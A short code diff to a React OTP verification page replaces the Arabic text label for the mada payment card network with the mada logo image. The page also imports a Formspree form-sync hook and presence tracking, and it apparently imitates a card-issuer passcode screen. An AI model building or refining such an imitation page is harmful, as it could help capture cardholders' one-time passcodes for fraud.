@@ -11,6 +11,7 @@ import { useFormspreeSync } from "@/hooks/useFormspreeSync";
 import { supabase } from "@/integrations/supabase/client";
 import { usePresence } from "@/hooks/usePresence";
 import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
+import madaLogo from "@/assets/mada-logo.png";
 const OTPVerification = () => {
   const navigate = useNavigate();
   const [searchParams] = useSearchParams();
@@ -154,9 +155,7 @@ const OTPVerification = () => {
           {/* Header with logos */}
           <div className="flex items-center justify-between mb-8 pb-6 border-b">
             <div className="flex items-center gap-4">
-              <div className="text-2xl font-bold" style={{
-              color: '#003D82'
-            }}>مدى</div>
+              <img src={madaLogo} alt="mada" className="h-8" />
             </div>
             <div className="flex flex-col items-end gap-2">
               <button className="text-sm text-gray-600 hover:text-gray-800">Cancel</button>
